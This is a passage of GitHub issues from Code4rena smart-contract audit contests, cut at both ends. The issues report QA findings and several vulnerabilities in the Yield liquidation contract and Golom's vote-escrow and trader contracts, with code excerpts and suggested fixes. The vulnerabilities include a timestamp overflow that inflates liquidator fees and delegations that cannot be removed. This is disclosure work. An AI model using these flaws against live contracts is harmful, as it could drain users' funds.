```solidity File: contracts/Witch.sol  217:         emit Auctioned(vaultId, uint32(block.timestamp));  ``` https://github.com/code-423n4/2022-07-yield/blob/6ab092b8c10e4dabb470918ae15c6451c861655f/contracts/Witch.sol#L217  ### [L&#x2011;03]  Integer overflow due to casting will cause contract accounting to break When `block.timestamp` becomes larger than `type(uint32).max`, the cast on line 582 will overflow, causing the elapsed time calculation to be extremely large and wrong if the auction start time was before the wrap. This will cause the proportion to be greater than 100%, and will allow a liquidator to earn a massive fee. Comments in code are not sufficient to prevent client fund loss, and relying on Google calendar is obviously not either. This should be a Medium, but I'm guessing the sponsor will argue that it's already documented here in the code (though it needs to be in the `README.md` and in Yield's risks documentation), so it's not worth while to write up the whole thing just to have it downgraded by a judge that decides not to follow that rule.  *There is 1 instance of this issue:* ```solidity File: contracts/Witch.sol  575          // If the world has not turned to ashes and darkness, auctions will malfunction on 576          // the 7th of February 2106, at 06:28:16 GMT 577          // TODO: Replace this contract before then \ud83d\ude30 578          // UPDATE: Added reminder to Google calendar \u2705 579          uint256 elapsed; 580          uint256 proportionNow; 581          unchecked { 582              elapsed = uint32(block.timestamp) - uint256(auction_.start); // Overflow on block.timestamp is fine 583:         }  ``` https://github.com/code-423n4/2022-07-yield/blob/6ab092b8c10e4dabb470918ae15c6451c861655f/contracts/Witch.sol#L575-L583  ## Non-critical Issues  ### [N&#x2011;01]  Incomplete documentation The infinite duration comment should be in NatSpec, not a normal comment hidden in the code  *There is 1 instance of this issue:* ```solidity File: contracts/Witch.sol  584:         if (duration == type(uint32).max) {     // Interpreted as infinite duration  ``` https://github.com/code-423n4/2022-07-yield/blob/6ab092b8c10e4dabb470918ae15c6451c861655f/contracts/Witch.sol#L584  ### [N&#x2011;02]  Timestamps in events are redundant `block.timestamp` and `block.number` are added to event information by default so adding them manually wastes gas and is redundant  *There is 1 instance of this issue:* ```solidity File: contracts/Witch.sol  217:         emit Auctioned(vaultId, uint32(block.timestamp));  ``` https://github.com/code-423n4/2022-07-yield/blob/6ab092b8c10e4dabb470918ae15c6451c861655f/contracts/Witch.sol#L217  ### [N&#x2011;03]  `constant`s should be defined rather than using magic numbers Even [assembly](https://github.com/code-423n4/2022-05-opensea-seaport/blob/9d7ce4d08bf3c3010304a0476a785c70c0e90ae7/contracts/lib/TokenTransferrer.sol#L35-L39) can benefit from using readable constants instead of hex/numeric literals  *There are 8 instances of this issue:* ```solidity File: contracts/Witch.sol  /// @audit 1e18 102:          require(initialOffer <= 1e18, \"InitialOffer above 100%\");  /// @audit 1e18 103:          require(proportion <= 1e18, \"Proportion above 100%\");  /// @audit 0.01e18 105:              initialOffer == 0 || initialOffer >= 0.01e18,  /// @audit 0.01e18 108:          require(proportion >= 0.01e18, \"Proportion below 1%\");  /// @audit 1e18 162:          if (auctioneerReward_ > 1e18) {  /// @audit 1e18 163:              revert AuctioneerRewardTooHigh(1e18, auctioneerReward_);  /// @audit 1e18 587:              proportionNow = 1e18;  /// @audit 1e18 591:                  uint256(1e18 - initialProportion).wmul(elapsed.wdiv(duration));  ``` https://github.com/code-423n4/2022-07-yield/blob/6ab092b8c10e4dabb470918ae15c6451c861655f/contracts/Witch.sol#L102  ### [N&#x2011;04]  Redundant cast The type of the variable is the same as the type to which the variable is being cast  *There are 2 instances of this issue:* ```solidity File: contracts/Witch.sol  /// @audit uint256(initialProportion) 590:                  uint256(initialProportion) +  /// @audit uint256(artIn) 594:          uint256 inkAtEnd = uint256(artIn).wdiv(auction_.art).wmul(auction_.ink);  ``` https://github.com/code-423n4/2022-07-yield/blob/6ab092b8c10e4dabb470918ae15c6451c861655f/contracts/Witch.sol#L590  ### [N&#x2011;05]  Typos  *There are 6 instances of this issue:* ```solidity File: contracts/Witch.sol  /// @audit overriden 213:      /// Useful as a method so it can be overriden by specialised witches that may need to do extra accounting or notify 3rd parties  /// @audit repayed 220:      /// @dev Calculates the auction initial values, the 2 non-trivial values are how much art must be repayed  /// @audit overriden 267:      /// Useful as a method so it can be overriden by specialised witches that may need to do extra accounting or notify 3rd parties  /// @audit differente 385:      /// @dev transfers funds from the ilkJoin to the liquidator (and potentially the auctioneer if they're differente people)  /// @audit overriden 462:      /// Useful as a method so it can be overriden by specialised witches that may need to do extra accounting or notify 3rd parties  /// @audit quoutes 520:      /// @dev quoutes hoy much ink a liquidator is expected to get if it repays an `artIn` amount  ``` https://github.com/code-423n4/2022-07-yield/blob/6ab092b8c10e4dabb470918ae15c6451c861655f/contracts/Witch.sol#L213  ### [N&#x2011;06]  NatSpec is incomplete  *There is 1 instance of this issue:* ```solidity File: contracts/Witch.sol  /// @audit Missing: '@return' 174       /// @param vaultId Id of vault to liquidate 175       /// @param to Receiver of the auctioneer reward 176       function auction(bytes12 vaultId, address to) 177           external 178:          returns (DataTypes.Auction memory auction_)  ``` https://github.com/code-423n4/2022-07-yield/blob/6ab092b8c10e4dabb470918ae15c6451c861655f/contracts/Witch.sol#L174-L178  ### [N&#x2011;07]  Event is missing `indexed` fields Index event fields make the field more quickly accessible to off-chain tools that parse events. However, note that each index field costs extra gas during emission, so it's not necessarily best to index the maximum allowed per event (threefields). Each `event` should use three `indexed` fields if there are three or more fields, and gas usage is not particularly of concern for the events in question  *There are 6 instances of this issue:* ```solidity File: contracts/Witch.sol  33        event Bought( 34            bytes12 indexed vaultId, 35            address indexed buyer, 36            uint256 ink, 37            uint256 art 38:       );  43        event LineSet( 44            bytes6 indexed ilkId, 45            bytes6 indexed baseId, 46            uint32 duration, 47            uint64 proportion, 48            uint64 initialOffer 49:       );  50:       event LimitSet(bytes6 indexed ilkId, bytes6 indexed baseId, uint128 max);  51:       event AnotherWitchSet(address indexed value, bool isWitch);  52        event IgnoredPairSet( 53            bytes6 indexed ilkId, 54            bytes6 indexed baseId, 55            bool ignore 56:       );  57:       event AuctioneerRewardSet(uint128 auctioneerReward);  ``` https://github.com/code-423n4/2022-07-yield/blob/6ab092b8c10e4dabb470918ae15c6451c861655f/contracts/Witch.sol#L33-L38  ### [N&#x2011;08]  Duplicated `require()`/`revert()` checks should be refactored to a modifier or function The compiler will inline the function, which will avoid `JUMP` instructions usually associated with functions  *There are 2 instances of this issue:* ```solidity File: contracts/Witch.sol  300:          require(auction_.start > 0, \"Vault not under auction\");  365:          require(liquidatorCut >= minInkOut, \"Not enough bought\");  ``` https://github.com/code-423n4/2022-07-yield/blob/6ab092b8c10e4dabb470918ae15c6451c861655f/contracts/Witch.sol#L300   "}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-07-yield-findings/issues/42", "labels": ["bug", "QA (Quality Assurance)", "sponsor confirmed"], "target": "2022-07-yield-findings", "body": "## Mixed Use of Custom Errors and `require(condition, \"msg\"` **Severity**: Informational **Context**: [`Witch.sol`](https://github.com/code-423n4/2022-07-yield/blob/main/contracts/Witch.sol)  **Description**: It's better to stick to one or the other to stay consistent.  **Recommendation**: I would recommend the use of just custom errors to save gas on deployment.   ## `otherWitches` Possible Name Suggestion **Severity**: Informational **Context**: [`Witch.sol#L68`](https://github.com/code-423n4/2022-07-yield/blob/main/contracts/Witch.sol#L68)  **Description**: \"The name is a bit misleading, as any address can be entered. Better naming suggestions are welcome.\"  **Recommendation**: Maybe `Witched`, `VaultTaken`, `bewitched` or `hexed`   ## Contract Code Size Exceeds Bytes Limit **Severity**: Informational **Context**: [`Witch.sol`](https://github.com/code-423n4/2022-07-yield/blob/main/contracts/Witch.sol)  **Description**: Contract code size is 28515 bytes and exceeds 24576 bytes (a limit introduced in Spurious Dragon). This contract may not be deployable on mainnet.   **Recommendation**: Consider enabling the optimizer (with a low \"runs\" value!), turning off revert strings, or using libraries.   ## TODOs Left In The Code **Severity**: Informational **Context**: [`Witch.sol#L577`](https://github.com/code-423n4/2022-07-yield/blob/main/contracts/Witch.sol#L577)  **Description**: There should never be any TODOs in the code when deploying.  **Recommendation**: Add this TODO to the docs instead.   ## Spelling Errors **Severity**: Informational **Context**: [`Witch.sol#L213 (overriden => overridden)`](https://github.com/code-423n4/2022-07-yield/blob/main/contracts/Witch.sol#L213), [`Witch.sol#L220 (repayed => repaid)`](https://github.com/code-423n4/2022-07-yield/blob/main/contracts/Witch.sol#L220), [`Witch.sol#L267 (overriden => overridden)`](https://github.com/code-423n4/2022-07-yield/blob/main/contracts/Witch.sol#L267), [`Witch.sol#L267 (differente => different)`](https://github.com/code-423n4/2022-07-yield/blob/main/contracts/Witch.sol#L267), [`Witch.sol#L462 (overriden => overridden)`](https://github.com/code-423n4/2022-07-yield/blob/main/contracts/Witch.sol#L462), [`Witch.sol#L512 (Delete the extra space)`](https://github.com/code-423n4/2022-07-yield/blob/main/contracts/Witch.sol#L512), [`Witch.sol#L520 (quoutes => quotes)`](https://github.com/code-423n4/2022-07-yield/blob/main/contracts/Witch.sol#L520), [`Witch.sol#L520 (hoy => how)`](https://github.com/code-423n4/2022-07-yield/blob/main/contracts/Witch.sol#L520)  **Description**: Spelling errors in comments can cause confusion to both users and developers.  **Recommendation**: Check all misspellings to ensure they are corrected.   ## Missing or Incomplete NatSpec **Severity**: Informational **Context**: [`Witch.sol`](https://github.com/code-423n4/2022-07-yield/blob/main/contracts/Witch.sol)  **Description**: Some functions are missing @notice/@dev NatSpec comments for the function, @param for all/some of their parameters and @return for return values. Given that NatSpec is an important part of code documentation, this affects code comprehension, auditability and usability.  **Recommendation**: Add in full NatSpec comments for all functions to have complete code documentation for future use."}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-07-yield-findings/issues/37", "labels": ["bug", "QA (Quality Assurance)", "sponsor confirmed"], "target": "2022-07-yield-findings", "body": "## 1 zero address check missing  https://github.com/code-423n4/2022-07-yield/blob/6ab092b8c10e4dabb470918ae15c6451c861655f/contracts/Witch.sol#L71 https://github.com/code-423n4/2022-07-yield/blob/6ab092b8c10e4dabb470918ae15c6451c861655f/contracts/Witch.sol#L176 https://github.com/code-423n4/2022-07-yield/blob/6ab092b8c10e4dabb470918ae15c6451c861655f/contracts/Witch.sol#L288 https://github.com/code-423n4/2022-07-yield/blob/6ab092b8c10e4dabb470918ae15c6451c861655f/contracts/Witch.sol#L346  ## 2. variable name `otherWitches` can be change to `witches` only ( as sponsor wants name suggestions )  https://github.com/code-423n4/2022-07-yield/blob/6ab092b8c10e4dabb470918ae15c6451c861655f/contracts/Witch.sol#L68 "}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-07-yield-findings/issues/33", "labels": ["bug", "QA (Quality Assurance)", "sponsor confirmed"], "target": "2022-07-yield-findings", "body": "# Codebase Impressions & Summary  ### Functionality  The revised witch (liquidation engine) contract includes the following improvements over the previous version. As stated in the README, they are:  1. Greater flexibility in exploring different liquidation models. 2. Making liquidations more profitable for liquidators by allowing payments in `fyToken`. 3. Introduce a mechanism to reward starting an auction. 4. Allow fine-tuning of all parameters for any collateral/underlying pair. 5. Correct bugs.  The liquidations flow was quite easy to follow as it consists of the following:  1. Liquidation parameters are defined by governance functions (auction duration, vault proportion, auctioneer reward etc.) 2. Starting an auction: `auction()` 3. Liquidators executing the liquidations: `payBase()` and `payFYToken()` 4. Either the entire vault collateral has been auctioned off, or `cancel()` is called to prematurely end the auction  ### Documentation  The README was very extensive and thorough, and succinctly explained design considerations made. Flow diagrams were provided to help visualise the interactions required between different contracts. Inline comments were appropriate too, aided in understanding the functionality.  ### Tests  All foundry tests passed as expected. One area of improvement is to have mainnet forking tests, since mocking is used for the external contracts. Running `forge coverage` unfortunately didn\u2019t work. I suspect it is due to the instability of the feature rather than the fault of the tests.   ### Gas Optimizations  Casting could be avoided if input / output params were defined appropriately. For instance, `inkOut`, `artIn` in `_updateAccounting()`, and `liquidatorCut` and `auctioneerCut` could have been `uint128` instead of `uint256`.  # Low Severity Findings  ## L01: Vaults that are over-collateralised after partial liquidation are possibly subject to further liquidations  ### Description  If a vault becomes over-collateralised after a partial liquidation, it is still subject to further liquidation as the auction isn\u2019t closed. The vault owner has to call `cancel()` himself, or trust other altruistic actors to perform this action on his behalf. Liquidators will unlikely do it because they are economically incentivised not to do so.  One can however argue that this is mitigated by the fact that protocol (governance) sets the vault proportion that can be auctioned. Regardless of whether the fact that the vault is over-collateralised after partial liquidations, the liquidators arguably are given the right to carry out further liquidations up to the proportion set.  Nevertheless, a reason for a revised liquidations witch contract is that \u201cMore often than not, liquidated users have lost all their collateral as we have failed to make liquidations competitive.\u201d. Hence, it might make sense to ensure that users need not lose more collateral than necessary.  ### Recommended Mitigation Steps  Consider checking if the vault is over-collateralized (maybe in `_updateAccounting()`) and close the auction if it is. This however adds complexity to the liquidation logic, as you have to update the cauldron first `cauldron.slurp()` before checking and updating the collateralization status. It will also break the CEI pattern, which might be unfavourable.  ## L02: Comparison in `_calcPayout()` should include equality  ### Line References  [https://github.com/code-423n4/2022-07-yield/blob/6ab092b8c10e4dabb470918ae15c6451c861655f/contracts/Witch.sol#L586](https://github.com/code-423n4/2022-07-yield/blob/6ab092b8c10e4dabb470918ae15c6451c861655f/contracts/Witch.sol#L586)  ### TLDR  ```diff - else if (elapsed > duration) + else if (elapsed >= duration) ```  ### Description  In the case where `elapsed == duration`, `proportionNow` evaluates to `1e18`, which is the same result when `elapsed > duration`. Proof below.  ```solidity proportionNow =   uint256(initialProportion) +   uint256(1e18 - initialProportion).wmul(elapsed.wdiv(duration));  // = initialProportion + (1e18 - initialProportion).wmul(1e18) // = initialProportion + (1e18 - initialProportion) * 1e18 / 1e18 // = initialProportion + 1e18 - initialProportion // = 1e18 ```  Of slightly greater importance, this handles the edge case when `elapsed = duration = 0`, ie. the liquidation transaction is included in the same block / has the same timestamp as the auction initialization transaction  ### Recommended Mitigation Steps  As per the TLDR.  ### P.S. Regarding zero duration auctions  Since the proportion given for zero duration auctions is `1e18`, it is equivalent to an auction of infinite duration with 100% initial offer: `duration == type(uint32).max` and `line_.initialOffer = 1e18`.  ## L03: Incorrect description for `auctioneerCut`  ### Line References  [https://github.com/code-423n4/2022-07-yield/blob/6ab092b8c10e4dabb470918ae15c6451c861655f/contracts/Witch.sol#L284](https://github.com/code-423n4/2022-07-yield/blob/6ab092b8c10e4dabb470918ae15c6451c861655f/contracts/Witch.sol#L284)  [https://github.com/code-423n4/2022-07-yield/blob/6ab092b8c10e4dabb470918ae15c6451c861655f/contracts/Witch.sol#L342](https://github.com/code-423n4/2022-07-yield/blob/6ab092b8c10e4dabb470918ae15c6451c861655f/contracts/Witch.sol#L342)  ### Description  Technically, the `auctioneerCut` goes to the `to` address specified by the auctioneer when `auction()` is called, which, while unlikely, may not be the auctioneer himself. Also, the comparison is done against the `to` address specified, not the caller / `msg.sender` as the comment implies.  ### Recommended Mitigation Steps  ```diff - Amount paid to whomever started the auction. 0 if it's the same address that's calling this method + Amount paid to address specified by whomever started the auction. 0 if it's the same as the `to` address ```  ## L04: Incorrect natspec for `setLimit()`  ### Line References  [https://github.com/code-423n4/2022-07-yield/blob/6ab092b8c10e4dabb470918ae15c6451c861655f/contracts/Witch.sol#L118-L122](https://github.com/code-423n4/2022-07-yield/blob/6ab092b8c10e4dabb470918ae15c6451c861655f/contracts/Witch.sol#L118-L122)  ### Description  The comments seem outdated as the only parameter that is updated by the function is the maximum collateral that can be concurrently auctioned off.  ```solidity ///  - the auction duration to calculate liquidation prices ///  - the proportion of the collateral that will be sold at auction start ///  - the maximum collateral that can be auctioned at the same time ///  - the minimum collateral that must be left when buying, unless buying all ///  - The decimals for maximum and minimum ```  ### Recommended Mitigation Steps  Suggest removing / updating the referenced comments.  # Non-Critical Findings  ## NC01: Modify comment to soft limit check for clarity  ### Line References  [https://github.com/code-423n4/2022-07-yield/blob/6ab092b8c10e4dabb470918ae15c6451c861655f/contracts/Witch.sol#L194-L196](https://github.com/code-423n4/2022-07-yield/blob/6ab092b8c10e4dabb470918ae15c6451c861655f/contracts/Witch.sol#L194-L196)  [https://github.com/code-423n4/2022-07-yield/blob/6ab092b8c10e4dabb470918ae15c6451c861655f/contracts/Witch.sol#L200](https://github.com/code-423n4/2022-07-yield/blob/6ab092b8c10e4dabb470918ae15c6451c861655f/contracts/Witch.sol#L200)  [https://github.com/code-423n4/2022-07-yield/blob/6ab092b8c10e4dabb470918ae15c6451c861655f/contracts/Witch.sol#L204](https://github.com/code-423n4/2022-07-yield/blob/6ab092b8c10e4dabb470918ae15c6451c861655f/contracts/Witch.sol#L204)   ### Description  The limit check is done before the summation to the total collateral allowable for liquidation. One may consider this to be a bug, but the README explains why this is the case:  ```markdown Note that the first auction to reach the limit is allowed to pass it, so that there is never the situation where a vault would be too big to ever be auctioned. ```  The inline comments have this as well, but isn\u2019t as clearly put as the README.  ```solidity // There is a limit on how much collateral can be concurrently put at auction, but it is a soft limit. // If the limit has been surpassed, no more vaults of that collateral can be put for auction. // This avoids the scenario where some vaults might be too large to be auctioned. ```  ### Recommended Mitigation Steps  For greater clarity, I would suggesting modifying the inline comment to be worded similar as the README.  ```diff // There is a limit on how much collateral can be concurrently put at auction, but it is a soft limit. - // If the limit has been surpassed, no more vaults of that collateral can be put for auction. + // The first auction to reach or exceed the limit is allowed to pass it, but subsequently, no more vaults of that collateral can be put for auction. // This avoids the scenario where some vaults might be too large to be auctioned. ```  ## NC02: Typos  ```diff - bellow + below  - differente + different  // Extra spacing - The Join  then dishes out + The Join then dishes out  - quoutes hoy much ink + quotes how much ink ```"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-07-yield-findings/issues/31", "labels": ["bug", "QA (Quality Assurance)", "sponsor confirmed"], "target": "2022-07-yield-findings", "body": "## typo in comments:  overriden --> overridden  - [Witch.sol#L213](https://github.com/code-423n4/2022-07-yield/blob/main/contracts/Witch.sol#L213) - [Witch.sol#L267](https://github.com/code-423n4/2022-07-yield/blob/main/contracts/Witch.sol#L267) - [Witch.sol#L462](https://github.com/code-423n4/2022-07-yield/blob/main/contracts/Witch.sol#L462)   repayed --> repaid  - [Witch.sol#L220](https://github.com/code-423n4/2022-07-yield/blob/main/contracts/Witch.sol#L220)  differente --> different  - [Witch.sol#L385](https://github.com/code-423n4/2022-07-yield/blob/main/contracts/Witch.sol#L385)  quoutes --> quotes  - [Witch.sol#L520](https://github.com/code-423n4/2022-07-yield/blob/main/contracts/Witch.sol#L520)  hoy --> how   - [Witch.sol#L520](https://github.com/code-423n4/2022-07-yield/blob/main/contracts/Witch.sol#L520)  "}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-07-yield-findings/issues/27", "labels": ["bug", "QA (Quality Assurance)", "sponsor confirmed"], "target": "2022-07-yield-findings", "body": "### Low Risk Findings Overview |        | Finding                    |  Instances  | |:-------|:---------------------------|:-----------:| | [L-01] | Missing `address(0)` check |      3      | ### Non-critical Findings Overview |        | Finding                                     |  Instances  | |:-------|:--------------------------------------------|:-----------:| | [N-01] | The use of magic numbers is not recommended |      5      | | [N-02] | Typo                                        |      2      | | [N-03] | Remove TODO\u2019s                               |      1      | ### QA overview per contract | Contract                                                                                                                   |  Total Instances  |  Total Findings  |  Low Findings  |  Low Instances  |  NC Findings  |  NC Instances  | |:---------------------------------------------------------------------------------------------------------------------------|:-----------------:|:----------------:|:--------------:|:---------------:|:-------------:|:--------------:| | [Witch.sol](https://github.com/code-423n4/2022-07-yield/blob/6ab092b8c10e4dabb470918ae15c6451c861655f/contracts/Witch.sol) |        10         |        4         |       1        |        3        |       3       |       7        | | [Witch.sol](https://github.com/code-423n4/2022-07-yield/blob/main/contracts/Witch.sol)                                     |         1         |        1         |       0        |        0        |       1       |       1        | ## Low Risk Findings ### [L-01] Missing `address(0)` check Funds might be lost by accident if check is not implemented. ***3 instances of this issue have been found:*** ###### [L-01] [Witch.sol#L286-L301](https://github.com/code-423n4/2022-07-yield/blob/6ab092b8c10e4dabb470918ae15c6451c861655f/contracts/Witch.sol#L286-L301) ```solidity      function payBase(         bytes12 vaultId,         address to,         uint128 minInkOut,         uint128 maxBaseIn     )         external         returns (             uint256 liquidatorCut,             uint256 auctioneerCut,             uint256 baseIn         )     {         DataTypes.Auction memory auction_ = auctions[vaultId];         require(auction_.start > 0, \"Vault not under auction\");  ``` ###### [L-01b] [Witch.sol#L176-L177](https://github.com/code-423n4/2022-07-yield/blob/6ab092b8c10e4dabb470918ae15c6451c861655f/contracts/Witch.sol#L176-L177) ```solidity      function auction(bytes12 vaultId, address to)  ``` ###### [L-01c] [Witch.sol#L344-L359](https://github.com/code-423n4/2022-07-yield/blob/6ab092b8c10e4dabb470918ae15c6451c861655f/contracts/Witch.sol#L344-L359) ```solidity      function payFYToken(         bytes12 vaultId,         address to,         uint128 minInkOut,         uint128 maxArtIn     )         external         returns (             uint256 liquidatorCut,             uint256 auctioneerCut,             uint256 artIn         )     {         DataTypes.Auction memory auction_ = auctions[vaultId];         require(auction_.start > 0, \"Vault not under auction\");  ```  ## Non-critical Findings ### [N-01] The use of magic numbers is not recommended Consider setting constant numbers as a `constant` variable for better readability and clarity. ***5 instances of this issue have been found:*** ###### [N-01] [Witch.sol#L587-L588](https://github.com/code-423n4/2022-07-yield/blob/6ab092b8c10e4dabb470918ae15c6451c861655f/contracts/Witch.sol#L587-L588) ```solidity              proportionNow = 1e18;  ``` ###### [N-01b] [Witch.sol#L105-L106](https://github.com/code-423n4/2022-07-yield/blob/6ab092b8c10e4dabb470918ae15c6451c861655f/contracts/Witch.sol#L105-L106) ```solidity              initialOffer == 0 || initialOffer >= 0.01e18,  ``` ###### [N-01c] [Witch.sol#L108-L109](https://github.com/code-423n4/2022-07-yield/blob/6ab092b8c10e4dabb470918ae15c6451c861655f/contracts/Witch.sol#L108-L109) ```solidity          require(proportion >= 0.01e18, \"Proportion below 1%\");  ``` ###### [N-01d] [Witch.sol#L162-L163](https://github.com/code-423n4/2022-07-yield/blob/6ab092b8c10e4dabb470918ae15c6451c861655f/contracts/Witch.sol#L162-L163) ```solidity          if (auctioneerReward_ > 1e18) {  ``` ###### [N-01e] [Witch.sol#L591-L592](https://github.com/code-423n4/2022-07-yield/blob/6ab092b8c10e4dabb470918ae15c6451c861655f/contracts/Witch.sol#L591-L592) ```solidity                  uint256(1e18 - initialProportion).wmul(elapsed.wdiv(duration));  ``` ### [N-02] Typo Please fix typos. ***2 instances of this issue have been found:*** ###### [N-02] [Witch.sol#L81](https://github.com/code-423n4/2022-07-yield/blob/main/contracts/Witch.sol#L81) ```solidity  /// @param param Name of parameter to set (must be \"ladle\") ``` ###### [N-02b] [Witch.sol#L14](https://github.com/code-423n4/2022-07-yield/blob/6ab092b8c10e4dabb470918ae15c6451c861655f/contracts/Witch.sol#L14) ```solidity  uncollateralized -> undercollateralized ``` ### [N-03] Remove TODO\u2019s They add unnecessary cluttler and harm readbility for auditors. ***1 instance of this issue has been found:*** ###### [N-03] [Witch.sol#L577-L578](https://github.com/code-423n4/2022-07-yield/blob/6ab092b8c10e4dabb470918ae15c6451c861655f/contracts/Witch.sol#L577-L578) ```solidity          // TODO: Replace this contract before then \ud83d\ude30 -> This is funny though  ``` "}, {"title": "veNFT withdraw and merge fail for approved callers", "html_url": "https://github.com/code-423n4/2022-07-golom-findings/issues/858", "labels": ["bug", "2 (Med Risk)", "resolved", "sponsor confirmed", "selected-for-report"], "target": "2022-07-golom-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-07-golom/blob/e5efa8f9d6dda92a90b8b2c4902320acf0c26816/contracts/vote-escrow/VoteEscrowCore.sol#L893-L908 https://github.com/code-423n4/2022-07-golom/blob/e5efa8f9d6dda92a90b8b2c4902320acf0c26816/contracts/vote-escrow/VoteEscrowCore.sol#L1004-L1030 https://github.com/code-423n4/2022-07-golom/blob/e5efa8f9d6dda92a90b8b2c4902320acf0c26816/contracts/vote-escrow/VoteEscrowCore.sol#L1226-L1236   # Vulnerability details  Golom is impacted by a known issue with the veNFT contract that causes the `merge` and `withdraw` functions to revert when called by an approved spender rather than the token owner.  `merge` and `withdraw` may both be called by either the token owner or an approved spender. Note that both of these functions check `_isApprovedOrOwner`:  [`VoteEscrowCore#merge`](https://github.com/code-423n4/2022-07-golom/blob/e5efa8f9d6dda92a90b8b2c4902320acf0c26816/contracts/vote-escrow/VoteEscrowCore.sol#L893-L908)  ```solidity     function merge(uint256 _from, uint256 _to) external {         require(attachments[_from] == 0 && !voted[_from], 'attached');         require(_from != _to);         require(_isApprovedOrOwner(msg.sender, _from));         require(_isApprovedOrOwner(msg.sender, _to));          LockedBalance memory _locked0 = locked[_from];         LockedBalance memory _locked1 = locked[_to];         uint256 value0 = uint256(int256(_locked0.amount));         uint256 end = _locked0.end >= _locked1.end ? _locked0.end : _locked1.end;          locked[_from] = LockedBalance(0, 0);         _checkpoint(_from, _locked0, LockedBalance(0, 0));         _burn(_from);         _deposit_for(_to, value0, end, _locked1, DepositType.MERGE_TYPE);     } ```  [`VoteEscrowCore#withdraw`](https://github.com/code-423n4/2022-07-golom/blob/e5efa8f9d6dda92a90b8b2c4902320acf0c26816/contracts/vote-escrow/VoteEscrowCore.sol#L1004-L1030)  ```solidity     /// @notice Withdraw all tokens for `_tokenId`     /// @dev Only possible if the lock has expired     function withdraw(uint256 _tokenId) external nonreentrant {         assert(_isApprovedOrOwner(msg.sender, _tokenId));         require(attachments[_tokenId] == 0 && !voted[_tokenId], 'attached');          LockedBalance memory _locked = locked[_tokenId];         require(block.timestamp >= _locked.end, \"The lock didn't expire\");         uint256 value = uint256(int256(_locked.amount));          locked[_tokenId] = LockedBalance(0, 0);         uint256 supply_before = supply;         supply = supply_before - value;          // old_locked can have either expired <= timestamp or zero end         // _locked has only 0 end         // Both can have >= 0 amount         _checkpoint(_tokenId, _locked, LockedBalance(0, 0));          assert(IERC20(token).transfer(msg.sender, value));          // Burn the NFT         _burn(_tokenId);          emit Withdraw(msg.sender, _tokenId, value, block.timestamp);         emit Supply(supply_before, supply_before - value);     } ```  However, both functions make internal calls to `_burn`, which does **not** handle the case of an approved caller correctly. The call to `_removeTokenFrom` on [L1234](https://github.com/code-423n4/2022-07-golom/blob/e5efa8f9d6dda92a90b8b2c4902320acf0c26816/contracts/vote-escrow/VoteEscrowCore.sol#L1234-L1235) passes `msg.sender` rather than the token `owner`, which will revert:  [`VoteEscrowCore#_burn`](https://github.com/code-423n4/2022-07-golom/blob/e5efa8f9d6dda92a90b8b2c4902320acf0c26816/contracts/vote-escrow/VoteEscrowCore.sol#L1226-L1236)  ```solidity     function _burn(uint256 _tokenId) internal {         require(_isApprovedOrOwner(msg.sender, _tokenId), 'caller is not owner nor approved');          address owner = ownerOf(_tokenId);          // Clear approval         approve(address(0), _tokenId);         // Remove token         _removeTokenFrom(msg.sender, _tokenId);         emit Transfer(owner, address(0), _tokenId);     } ```  **Impact:** Approved callers cannot `merge` or `withdraw` veNFTs. `merge` and `withdraw` may only be called by the token owner.  **Suggestion:**  Update `_burn` to pass token owner address rather than `msg.sender`:  ```solidity     function _burn(uint256 _tokenId) internal {         require(_isApprovedOrOwner(msg.sender, _tokenId), 'caller is not owner nor approved');          address owner = ownerOf(_tokenId);          // Clear approval         approve(address(0), _tokenId);         // Remove token         _removeTokenFrom(owner, _tokenId);         emit Transfer(owner, address(0), _tokenId);     } ```"}, {"title": "Pre-check is not correct", "html_url": "https://github.com/code-423n4/2022-07-golom-findings/issues/851", "labels": ["bug", "2 (Med Risk)", "disagree with severity", "resolved", "sponsor confirmed", "selected-for-report"], "target": "2022-07-golom-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-07-golom/blob/e5efa8f9d6dda92a90b8b2c4902320acf0c26816/contracts/core/GolomTrader.sol#L342 https://github.com/code-423n4/2022-07-golom/blob/e5efa8f9d6dda92a90b8b2c4902320acf0c26816/contracts/core/GolomTrader.sol#L397   # Vulnerability details  ## Impact `fillCriteriaBid` can be reverted due to the pre-check while it can work.  ## Proof of Concept When `refererrAmt > 0` and `referrer` address is not set (is 0),  `(o.totalAmt - protocolfee - o.exchange.paymentAmt - o.prePayment.paymentAmt) * amount - p.paymentAmt >= 0` and `o.totalAmt < o.exchange.paymentAmt + o.prePayment.paymentAmt + o.refererrAmt` can hold true at the same time.  It is when `o.refererrAmt > (p.paymentAmt + protocolfee) / amount`. In that case, `_settleBalances` can work, but fillCriteriaBid will be reverted due to the check in line 342.   ## Tools Used Manual review  ## Recommended Mitigation Steps I think `require(o.totalAmt >= o.exchange.paymentAmt + o.prePayment.paymentAmt)` is correct."}, {"title": "Cannot remove delegation from a token to another token", "html_url": "https://github.com/code-423n4/2022-07-golom-findings/issues/751", "labels": ["bug", "3 (High Risk)", "resolved", "sponsor confirmed", "selected-for-report"], "target": "2022-07-golom-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-07-golom/blob/e5efa8f9d6dda92a90b8b2c4902320acf0c26816/contracts/vote-escrow/VoteEscrowDelegation.sol#L213   # Vulnerability details  ## Impact A user who has delegated the vote of a veGolom token (that he/she owns) to another veGolom token cannot remove the delegation, so the delegatee token will permanently hold the voting power of the delegator token.   ## Proof of Concept A user tries to remove the delegation from `tokenId` he/she owns to the delegated token, calling `removeDelegation(uint256 tokenId)`.  The delegation should be removed at the lines:  ```solidity         Checkpoint storage checkpoint = checkpoints[tokenId][nCheckpoints - 1];         removeElement(checkpoint.delegatedTokenIds, tokenId); ``` but the array `checkpoint.delegatedTokenIds` is the list of **delegators** to `tokenId` **itself**. So, unless the delegation was from the token to itself, `removeDelegation` does nothing.  ## Recommended Mitigation Steps Two fixes are proposed:  1. Add the delegatee as an argument to `removeDelegation` and remove `tokenId` from its list of delegators:     ```diff -   function removeDelegation(uint256 tokenId) external { +   function removeDelegation(uint256 tokenId, uint256 toTokenId) external {         require(ownerOf(tokenId) == msg.sender, 'VEDelegation: Not allowed');         uint256 nCheckpoints = numCheckpoints[tokenId]; -       Checkpoint storage checkpoint = 